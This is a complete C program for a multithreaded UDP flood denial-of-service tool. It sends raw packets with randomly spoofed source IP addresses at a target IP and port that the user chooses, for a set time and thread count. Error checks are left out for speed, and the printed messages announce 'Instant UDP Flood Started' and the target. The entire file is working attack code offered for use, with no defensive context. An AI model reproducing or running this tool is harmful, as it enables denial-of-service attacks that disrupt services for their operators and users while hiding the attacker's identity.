#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <sys/socket.h>
#include <pthread.h>
#include <time.h>

// Pseudo header for UDP checksum
struct pseudo_header {
    u_int32_t src;
    u_int32_t dst;
    u_int8_t zero;
    u_int8_t proto;
    u_int16_t length;
};

// Thread data
struct thread_data {
    char *target_ip;
    int port;
    int duration;  // Duration in seconds
};

// Checksum function
unsigned short checksum(void *b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0;
    unsigned short result;

    for (sum = 0; len > 1; len -= 2)
        sum += *buf++;
    if (len == 1)
        sum += *(unsigned char *)buf;

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

// Generate random spoofed IP
u_int32_t random_ip() {
    return (rand() % 254 + 1) |
           ((rand() % 256) << 8) |
           ((rand() % 256) << 16) |
           ((rand() % 256) << 24);
}

// Attack function: sends packets non-stop for 'duration' seconds
void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        perror("socket");
        pthread_exit(NULL);
    }

    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("setsockopt");
        close(sock);
        pthread_exit(NULL);
    }

    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(data->port);
    dest.sin_addr.s_addr = inet_addr(data->target_ip);

    // Payload
    const char *payload_msg = "X";
    int payload_len = strlen(payload_msg);
    int ip_hdr_len = sizeof(struct iphdr);
    int udp_hdr_len = sizeof(struct udphdr);
    int total_len = ip_hdr_len + udp_hdr_len + payload_len;

    char datagram[4096];

    time_t end = time(NULL) + data->duration;  // Run for N seconds

    while (time(NULL) < end) {
        memset(datagram, 0, total_len);

        struct iphdr *iph = (struct iphdr *)datagram;
        struct udphdr *udph = (struct udphdr *)(datagram + ip_hdr_len);
        char *payload = datagram + ip_hdr_len + udp_hdr_len;

        memcpy(payload, payload_msg, payload_len);

        // === IP Header ===
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = htons(total_len);
        iph->id = htons(rand() % 65535);
        iph->frag_off = 0;
        iph->ttl = 64;
        iph->protocol = IPPROTO_UDP;
        iph->saddr = htonl(random_ip());            // Spoofed source
        iph->daddr = dest.sin_addr.s_addr;
        iph->check = 0;
        iph->check = checksum((unsigned short *)iph, ip_hdr_len);

        // === UDP Header ===
        udph->source = htons(rand() % 65535);
        udph->dest = htons(data->port);
        udph->len = htons(udp_hdr_len + payload_len);
        udph->check = 0;  // Skip UDP checksum for speed

        /*
        // Optional: Enable UDP checksum (slower)
        struct pseudo_header psh = {
            .src = iph->saddr,
            .dst = iph->daddr,
            .zero = 0,
            .proto = IPPROTO_UDP,
            .length = udph->len
        };
        int psize = sizeof(struct pseudo_header) + udp_hdr_len + payload_len;
        char pseudogram[psize];
        memcpy(pseudogram, &psh, sizeof(struct pseudo_header));
        memcpy(pseudogram + sizeof(struct pseudo_header), udph, udp_hdr_len + payload_len);
        udph->check = checksum((unsigned short *)pseudogram, psize);
        */

        // === Send Packet ===
        sendto(sock, datagram, total_len, 0, (struct sockaddr *)&dest, sizeof(dest));
        // No error check for speed
    }

    close(sock);
    pthread_exit(NULL);
}

// ============ MAIN ============
int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("Usage: %s <ip> <port> <time> <threads>\n", argv[0]);
        printf("Example: %s 192.168.1.1 80 10 8\n", argv[0]);
        exit(1);
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads = atoi(argv[4]);

    // Seed random
    srand(time(NULL) ^ getpid());

    // Allocate thread IDs
    pthread_t *tids = malloc(threads * sizeof(pthread_t));
    if (!tids) {
        perror("malloc");
        exit(1);
    }

    // Shared data
    struct thread_data data = { ip, port, duration };

    printf("🚀 Instant UDP Flood Started\n");
    printf("🎯 Target: %s:%d\n", ip, port);
    printf("⏱  Duration: %d seconds\n", duration);
    printf("🧵 Threads: %d\n", threads);
    printf("⚡ Flooding at maximum speed...\n");

    // Create threads
    for (int i = 0; i < threads; i++) {
        if (pthread_create(&tids[i], NULL, attack, &data) != 0) {
            perror("pthread_create");
            exit(1);
        }
    }

    // Wait for all threads
    for (int i = 0; i < threads; i++) {
        pthread_join(tids[i], NULL);
    }

    free(tids);

    printf("✅ Flood finished. Packets sent instantly during %d seconds.\n", duration);
    return 0;
}